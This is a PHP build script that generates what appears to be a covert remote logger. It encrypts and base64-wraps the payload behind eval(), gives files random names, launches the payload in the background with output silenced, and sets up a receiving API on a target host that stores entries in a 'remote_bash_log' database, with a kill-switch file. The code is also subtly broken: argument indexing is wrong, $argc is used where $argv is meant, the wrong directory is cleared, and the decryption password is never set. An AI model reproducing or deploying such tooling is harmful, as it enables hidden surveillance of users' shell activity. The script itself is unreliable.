<?php

require_once __DIR__ . '/../src/randomAlphaNumericString.php';

if ($argc !== 3) {
    echo 'call this script the following way: php maker.php source-ip target-ip';
    die(1);
}
$pass = randomAlphaNumericString(256);
$iv = randomAlphaNumericString(8);
$crypt = 'blowfish';
$target = $argv[2];
$source = $argv[1];
$killkey = randomAlphaNumericString(512);
$killName = 'KILL_ME_' . randomAlphaNumericString(12);
$api = randomAlphaNumericString(12);
$logger = randomAlphaNumericString(3);
$key = randomAlphaNumericString(512);
$protocol = $argv[3] ?? 'http';

$out = __DIR__ . '/../dist';
$in = __DIR__ . '/../src';

if (!is_dir($out)) {
    mkdir($out);
}
if (!is_dir("$out/source")) {
    mkdir("$out/source");
} else {
    foreach (array_diff(scandir("$out/source"), ['.', '..']) as $file) {
        unlink("$out/source/$file");
    }
}
if (!is_dir("$out/target")) {
    mkdir("$out/target");
} else {
    foreach (array_diff(scandir("$out/target"), ['.', '..']) as $file) {
        unlink("$out/source/$file");
    }
}
if (!is_dir("$out/home")) {
    mkdir("$out/home");
} else {
    foreach (array_diff(scandir("$out/home"), ['.', '..']) as $file) {
        unlink("$out/home/$file");
    }
}

file_put_contents(
    "$out/source/$logger.php",
    "<?php eval(openssl_decrypt(base64_decode("
        . "'" . openssl_encrypt(
            substr(
                file_get_contents("$in/randomAlphaNumericString.php"),
                5
            )
            . "\n"
            . substr(
                str_replace(
                    ['##KILLKEY##', '##KILLNAME##'],
                    [$killkey, $killName],
                    file_get_contents("$in/log.php")
                ),
                5
            ),
            $crypt,
            $pass,
            0,
            $iv
        ) . "'), getenv('LOCAL_CRYPT'), getenv('LOCAL_PASS'), OPENSSL_RAW_DATA, getenv('LOCAL_IV')));"
);
file_put_contents(
    "$out/source/$logger.sh",
    "TARGET_API=$api "
    . "TARGET_PROTOCOL=$protocol "
    . "TARGET_HOST=$target "
    . "TARGET_KEY=$key "
    . "LOCAL_CRYPT=$crypt "
    . "LOCAL_IV=$iv "
    . "LOCAL_CRYPT=$crypt "
    . "php $logger.php &>/dev/null &"
);
file_put_contents(
    "$out/target/$api.php",
    str_replace(
        ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
        [$source, $key, $argc[5] ?? 'false', ($argc[4] ?? 'sqlite:/var/log/remote_bash_log.sqlite')],
        file_get_contents("$in/api.php")
    )
);
file_put_contents("$out/home/$logger.kill", "export $killName=$killkey");
